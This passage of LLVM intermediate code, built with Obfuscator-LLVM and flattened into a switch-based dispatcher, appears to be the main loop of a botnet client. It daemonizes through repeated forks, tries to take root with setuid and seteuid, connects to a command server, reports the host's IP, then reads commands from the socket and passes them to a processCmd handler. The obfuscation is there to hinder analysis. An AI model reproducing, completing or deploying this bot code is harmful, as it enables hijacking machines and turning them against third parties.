  call void @init_rand(i32 %41)
  %42 = call i32 @fork() #2
  store i32 %42, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %7, align 4
  %switchVar = alloca i32
  store i32 207134352, i32* %switchVar
  %.reg2mem3 = alloca i1
  %.reg2mem5 = alloca i1
  %.reg2mem7 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 207134352, label %first
    i32 -1183376354, label %45
    i32 68551591, label %48
    i32 -262317386, label %52
    i32 -837887031, label %56
    i32 1143276089, label %57
    i32 1577312223, label %61
    i32 1817185350, label %62
    i32 519037109, label %63
    i32 -1408327746, label %64
    i32 2020645734, label %65
    i32 637235207, label %66
    i32 -1194224406, label %67
    i32 709532042, label %72
    i32 1552582376, label %76
    i32 1320523628, label %80
    i32 -802969848, label %82
    i32 1102173382, label %87
    i32 -1750728349, label %93
    i32 -553303146, label %94
    i32 200249474, label %100
    i32 -822169710, label %109
    i32 198520093, label %112
    i32 248719302, label %118
    i32 -193434298, label %129
    i32 1412867845, label %132
    i32 -1870579246, label %145
    i32 -16691437, label %151
    i32 -1691530490, label %161
    i32 -1657736886, label %164
    i32 135186537, label %168
    i32 1853103240, label %169
    i32 -1979021691, label %172
    i32 1477784939, label %182
    i32 -380262692, label %183
    i32 1410309670, label %189
    i32 1308256499, label %190
    i32 -1509751739, label %197
    i32 -1964305496, label %200
    i32 -426087727, label %206
    i32 1824568266, label %211
    i32 -774784457, label %213
    i32 649925414, label %216
    i32 1729435887, label %222
    i32 -1411998781, label %223
    i32 -1447149215, label %232
    i32 901434942, label %242
    i32 -2096472644, label %251
    i32 -1386409932, label %253
    i32 1894611740, label %259
    i32 605089280, label %261
    i32 566453632, label %267
    i32 -1801658378, label %272
    i32 968244747, label %274
    i32 -106510342, label %277
    i32 514040172, label %282
    i32 1147332674, label %287
    i32 -1724113861, label %296
    i32 1306564592, label %301
    i32 -1824741288, label %305
    i32 -1806880759, label %311
    i32 853276214, label %334
    i32 749791380, label %336
    i32 -795154008, label %342
    i32 1160410162, label %343
    i32 929566564, label %348
    i32 2035430121, label %353
    i32 -1327624833, label %356
    i32 -1310192980, label %357
    i32 575573618, label %358
    i32 -1888301608, label %359
    i32 1491763195, label %360
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %43 = icmp ne i32 %.reload, 0
  %44 = select i1 %43, i32 -1183376354, i32 68551591
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %7, align 4
  %47 = call i32 @waitpid(i32 %46, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %7, align 4
  %50 = icmp ne i32 %49, 0
  %51 = select i1 %50, i32 2020645734, i32 -262317386
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = call i32 @fork() #2
  store i32 %53, i32* %8, align 4
  %54 = icmp ne i32 %53, 0
  %55 = select i1 %54, i32 -837887031, i32 1143276089
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %8, align 4
  %59 = icmp ne i32 %58, 0
  %60 = select i1 %59, i32 1817185350, i32 1577312223
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 519037109, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  store i32 519037109, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  store i32 -1408327746, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 637235207, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 637235207, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 -1194224406, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.112, i32 0, i32 0)) #2
  %69 = call i32 @setuid(i32 0) #2
  %70 = call i32 @seteuid(i32 0) #2
  %71 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  store i32 709532042, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = call i32 @fork() #2
  %74 = icmp eq i32 %73, 0
  %75 = select i1 %74, i32 1552582376, i32 1491763195
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = call i32 @initConnection()
  %78 = icmp ne i32 %77, 0
  %79 = select i1 %78, i32 1320523628, i32 -802969848
  store i32 %79, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = call i32 @sleep(i32 5)
  store i32 709532042, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* @mainCommSock, align 4
  %84 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %85 = call i8* @inet_ntoa(i32 %84) #2
  %86 = call i32 (i32, i8*, ...) @sockprintf(i32 %83, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.113, i32 0, i32 0), i8* %85, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.114, i32 0, i32 0))
  call void @ioctl_keepalive()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  store i32 1102173382, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i32, i32* @mainCommSock, align 4
  %89 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %90 = call i32 @recvLine(i32 %88, i8* %89, i32 4096)
  store i32 %90, i32* %11, align 4
  %91 = icmp ne i32 %90, -1
  %92 = select i1 %91, i32 -1750728349, i32 -1888301608
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 0, i32* %12, align 4
  store i32 -553303146, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %12, align 4
  %96 = sext i32 %95 to i64
  %97 = load i64, i64* @numpids, align 8
  %98 = icmp ult i64 %96, %97
  %99 = select i1 %98, i32 200249474, i32 -1979021691
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = load i32*, i32** @pids, align 8
  %102 = load i32, i32* %12, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i32, i32* %101, i64 %103
  %105 = load i32, i32* %104, align 4
  %106 = call i32 @waitpid(i32 %105, i32* null, i32 1)
  %107 = icmp sgt i32 %106, 0
  %108 = select i1 %107, i32 -822169710, i32 135186537
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i32, i32* %12, align 4
  %111 = add nsw i32 %110, 1
  store i32 %111, i32* %14, align 4
  store i32 198520093, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i32, i32* %14, align 4
  %114 = zext i32 %113 to i64
  %115 = load i64, i64* @numpids, align 8
  %116 = icmp ult i64 %114, %115
  %117 = select i1 %116, i32 248719302, i32 1412867845
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i32*, i32** @pids, align 8
  %120 = load i32, i32* %14, align 4
  %121 = zext i32 %120 to i64
  %122 = getelementptr inbounds i32, i32* %119, i64 %121
  %123 = load i32, i32* %122, align 4
  %124 = load i32*, i32** @pids, align 8
  %125 = load i32, i32* %14, align 4
  %126 = sub i32 %125, 1
  %127 = zext i32 %126 to i64
  %128 = getelementptr inbounds i32, i32* %124, i64 %127
  store i32 %123, i32* %128, align 4
  store i32 -193434298, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i32, i32* %14, align 4
  %131 = add i32 %130, 1
  store i32 %131, i32* %14, align 4
  store i32 198520093, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i32*, i32** @pids, align 8
  %134 = load i32, i32* %14, align 4
  %135 = sub i32 %134, 1
  %136 = zext i32 %135 to i64
  %137 = getelementptr inbounds i32, i32* %133, i64 %136
  store i32 0, i32* %137, align 4
  %138 = load i64, i64* @numpids, align 8
  %139 = add i64 %138, -1
  store i64 %139, i64* @numpids, align 8
  %140 = load i64, i64* @numpids, align 8
  %141 = add i64 %140, 1
  %142 = mul i64 %141, 4
  %143 = call noalias i8* @malloc(i64 %142) #2
  %144 = bitcast i8* %143 to i32*
  store i32* %144, i32** %13, align 8
  store i32 0, i32* %14, align 4
  store i32 -1870579246, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load i32, i32* %14, align 4
  %147 = zext i32 %146 to i64
  %148 = load i64, i64* @numpids, align 8
  %149 = icmp ult i64 %147, %148
  %150 = select i1 %149, i32 -16691437, i32 -1657736886
  store i32 %150, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = load i32*, i32** @pids, align 8
  %153 = load i32, i32* %14, align 4
  %154 = zext i32 %153 to i64
  %155 = getelementptr inbounds i32, i32* %152, i64 %154
  %156 = load i32, i32* %155, align 4
  %157 = load i32*, i32** %13, align 8
  %158 = load i32, i32* %14, align 4
  %159 = zext i32 %158 to i64
  %160 = getelementptr inbounds i32, i32* %157, i64 %159
  store i32 %156, i32* %160, align 4
  store i32 -1691530490, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = load i32, i32* %14, align 4
  %163 = add i32 %162, 1
  store i32 %163, i32* %14, align 4
  store i32 -1870579246, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i32*, i32** @pids, align 8
  %166 = bitcast i32* %165 to i8*
  call void @free(i8* %166) #2
  %167 = load i32*, i32** %13, align 8
  store i32* %167, i32** @pids, align 8
  store i32 135186537, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  store i32 1853103240, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i32, i32* %12, align 4
  %171 = add nsw i32 %170, 1
  store i32 %171, i32* %12, align 4
  store i32 -553303146, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i32, i32* %11, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %174
  store i8 0, i8* %175, align 1
  %176 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %176)
  %177 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %178 = call i8* @strstr(i8* %177, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i32 0, i32 0)) #10
  %179 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %180 = icmp eq i8* %178, %179
  %181 = select i1 %180, i32 1477784939, i32 -380262692
  store i32 %181, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  store i32 1102173382, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %185 = call i8* @strstr(i8* %184, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.115, i32 0, i32 0)) #10
  %186 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %187 = icmp eq i8* %185, %186
  %188 = select i1 %187, i32 1410309670, i32 1308256499
  store i32 %188, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:190:                                    ; preds = %loopEntry
  %191 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %191, i8** %15, align 8
  %192 = load i8*, i8** %15, align 8
  %193 = load i8, i8* %192, align 1
  %194 = zext i8 %193 to i32
  %195 = icmp eq i32 %194, 33
  %196 = select i1 %195, i32 -1509751739, i32 575573618
  store i32 %196, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i8*, i8** %15, align 8
  %199 = getelementptr inbounds i8, i8* %198, i64 1
  store i8* %199, i8** %16, align 8
  store i32 -1964305496, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = load i8*, i8** %16, align 8
  %202 = load i8, i8* %201, align 1
  %203 = zext i8 %202 to i32
  %204 = icmp ne i32 %203, 32
  %205 = select i1 %204, i32 -426087727, i32 1824568266
  store i32 %205, i32* %switchVar
  store i1 false, i1* %.reg2mem3
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = load i8*, i8** %16, align 8
  %208 = load i8, i8* %207, align 1
  %209 = zext i8 %208 to i32
  %210 = icmp ne i32 %209, 0
  store i32 1824568266, i32* %switchVar
  store i1 %210, i1* %.reg2mem3
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %.reload4 = load i1, i1* %.reg2mem3
  %212 = select i1 %.reload4, i32 -774784457, i32 649925414
  store i32 %212, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %214 = load i8*, i8** %16, align 8
  %215 = getelementptr inbounds i8, i8* %214, i32 1
  store i8* %215, i8** %16, align 8
  store i32 -1964305496, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i8*, i8** %16, align 8
  %218 = load i8, i8* %217, align 1
  %219 = zext i8 %218 to i32
  %220 = icmp eq i32 %219, 0
  %221 = select i1 %220, i32 1729435887, i32 -1411998781
  store i32 %221, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  store i32 1102173382, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = load i8*, i8** %16, align 8
  store i8 0, i8* %224, align 1
  %225 = load i8*, i8** %15, align 8
  %226 = getelementptr inbounds i8, i8* %225, i64 1
  store i8* %226, i8** %16, align 8
  %227 = load i8*, i8** %15, align 8
  %228 = load i8*, i8** %16, align 8
  %229 = call i64 @strlen(i8* %228) #10
  %230 = getelementptr inbounds i8, i8* %227, i64 %229
  %231 = getelementptr inbounds i8, i8* %230, i64 2
  store i8* %231, i8** %15, align 8
  store i32 -1447149215, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  %233 = load i8*, i8** %15, align 8
  %234 = load i8*, i8** %15, align 8
  %235 = call i64 @strlen(i8* %234) #10
  %236 = sub i64 %235, 1
  %237 = getelementptr inbounds i8, i8* %233, i64 %236
  %238 = load i8, i8* %237, align 1
  %239 = zext i8 %238 to i32
  %240 = icmp eq i32 %239, 10
  %241 = select i1 %240, i32 -2096472644, i32 901434942
  store i32 %241, i32* %switchVar
  store i1 true, i1* %.reg2mem5
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i8*, i8** %15, align 8
  %244 = load i8*, i8** %15, align 8
  %245 = call i64 @strlen(i8* %244) #10
  %246 = sub i64 %245, 1
  %247 = getelementptr inbounds i8, i8* %243, i64 %246
  %248 = load i8, i8* %247, align 1
  %249 = zext i8 %248 to i32
  %250 = icmp eq i32 %249, 13
  store i32 -2096472644, i32* %switchVar
  store i1 %250, i1* %.reg2mem5
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %.reload6 = load i1, i1* %.reg2mem5
  %252 = select i1 %.reload6, i32 -1386409932, i32 1894611740
  store i32 %252, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = load i8*, i8** %15, align 8
  %255 = load i8*, i8** %15, align 8
  %256 = call i64 @strlen(i8* %255) #10
  %257 = sub i64 %256, 1
  %258 = getelementptr inbounds i8, i8* %254, i64 %257
  store i8 0, i8* %258, align 1
  store i32 -1447149215, i32* %switchVar
  br label %loopEnd

; <label>:259:                                    ; preds = %loopEntry
  %260 = load i8*, i8** %15, align 8
  store i8* %260, i8** %17, align 8
  store i32 605089280, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  %262 = load i8*, i8** %15, align 8
  %263 = load i8, i8* %262, align 1
  %264 = zext i8 %263 to i32
  %265 = icmp ne i32 %264, 32
  %266 = select i1 %265, i32 566453632, i32 -1801658378
  store i32 %266, i32* %switchVar
  store i1 false, i1* %.reg2mem7
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  %268 = load i8*, i8** %15, align 8
  %269 = load i8, i8* %268, align 1
  %270 = zext i8 %269 to i32
  %271 = icmp ne i32 %270, 0
  store i32 -1801658378, i32* %switchVar
  store i1 %271, i1* %.reg2mem7
  br label %loopEnd

; <label>:272:                                    ; preds = %loopEntry
  %.reload8 = load i1, i1* %.reg2mem7
  %273 = select i1 %.reload8, i32 968244747, i32 -106510342
  store i32 %273, i32* %switchVar
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %275 = load i8*, i8** %15, align 8
  %276 = getelementptr inbounds i8, i8* %275, i32 1
  store i8* %276, i8** %15, align 8
  store i32 605089280, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  %278 = load i8*, i8** %15, align 8
  store i8 0, i8* %278, align 1
  %279 = load i8*, i8** %15, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %15, align 8
  %281 = load i8*, i8** %17, align 8
  store i8* %281, i8** %18, align 8
  store i32 514040172, i32* %switchVar
  br label %loopEnd

; <label>:282:                                    ; preds = %loopEntry
  %283 = load i8*, i8** %18, align 8
  %284 = load i8, i8* %283, align 1
  %285 = icmp ne i8 %284, 0
  %286 = select i1 %285, i32 1147332674, i32 -1724113861
  store i32 %286, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i8*, i8** %18, align 8
  %289 = load i8, i8* %288, align 1
  %290 = zext i8 %289 to i32
  %291 = call i32 @toupper(i32 %290) #10
  %292 = trunc i32 %291 to i8
  %293 = load i8*, i8** %18, align 8
  store i8 %292, i8* %293, align 1
  %294 = load i8*, i8** %18, align 8
  %295 = getelementptr inbounds i8, i8* %294, i32 1
  store i8* %295, i8** %18, align 8
  store i32 514040172, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  %297 = load i8*, i8** %15, align 8
  %298 = call i8* @strtok(i8* %297, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0)) #2
  store i8* %298, i8** %21, align 8
  %299 = load i8*, i8** %17, align 8
  %300 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %299, i8** %300, align 16
  store i32 1306564592, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  %302 = load i8*, i8** %21, align 8
  %303 = icmp ne i8* %302, null
  %304 = select i1 %303, i32 -1824741288, i32 749791380
  store i32 %304, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i8*, i8** %21, align 8
  %307 = load i8, i8* %306, align 1
  %308 = zext i8 %307 to i32
  %309 = icmp ne i32 %308, 10
  %310 = select i1 %309, i32 -1806880759, i32 853276214
  store i32 %310, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  %312 = load i8*, i8** %21, align 8
  %313 = call i64 @strlen(i8* %312) #10
  %314 = add i64 %313, 1
  %315 = call noalias i8* @malloc(i64 %314) #2
  %316 = load i32, i32* %20, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %317
  store i8* %315, i8** %318, align 8
  %319 = load i32, i32* %20, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %320
  %322 = load i8*, i8** %321, align 8
  %323 = load i8*, i8** %21, align 8
  %324 = call i64 @strlen(i8* %323) #10
  %325 = add i64 %324, 1
  call void @llvm.memset.p0i8.i64(i8* %322, i8 0, i64 %325, i32 1, i1 false)
  %326 = load i32, i32* %20, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %327
  %329 = load i8*, i8** %328, align 8
  %330 = load i8*, i8** %21, align 8
  %331 = call i8* @strcpy(i8* %329, i8* %330) #2
  %332 = load i32, i32* %20, align 4
  %333 = add nsw i32 %332, 1
  store i32 %333, i32* %20, align 4
  store i32 853276214, i32* %switchVar
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  %335 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0)) #2
  store i8* %335, i8** %21, align 8
  store i32 1306564592, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  %337 = load i32, i32* %20, align 4
  %338 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %337, i8** %338)
  %339 = load i32, i32* %20, align 4
  %340 = icmp sgt i32 %339, 1
  %341 = select i1 %340, i32 -795154008, i32 -1310192980
  store i32 %341, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  store i32 1160410162, i32* %switchVar
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  %344 = load i32, i32* %22, align 4
  %345 = load i32, i32* %20, align 4
  %346 = icmp slt i32 %344, %345
  %347 = select i1 %346, i32 929566564, i32 -1327624833
  store i32 %347, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  %349 = load i32, i32* %22, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %350
  %352 = load i8*, i8** %351, align 8
  call void @free(i8* %352) #2
  store i32 2035430121, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  %354 = load i32, i32* %22, align 4
  %355 = add nsw i32 %354, 1
  store i32 %355, i32* %22, align 4
  store i32 1160410162, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  store i32 -1310192980, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  store i32 575573618, i32* %switchVar
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  store i32 1102173382, i32* %switchVar
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  store i32 1491763195, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  ret i32 0

loopEnd:                                          ; preds = %359, %358, %357, %356, %353, %348, %343, %342, %336, %334, %311, %305, %301, %296, %287, %282, %277, %274, %272, %267, %261, %259, %253, %251, %242, %232, %223, %222, %216, %213, %211, %206, %200, %197, %190, %183, %182, %172, %169, %168, %164, %161, %151, %145, %132, %129, %118, %112, %109, %100, %94, %93, %87, %82, %80, %76, %72, %67, %66, %65, %64, %63, %62, %61, %57, %52, %48, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare i32 @setuid(i32) #4

; Function Attrs: nounwind
declare i32 @seteuid(i32) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146710168}
!2 = !{i32 -2146709460}
!3 = !{i32 -2146708763}
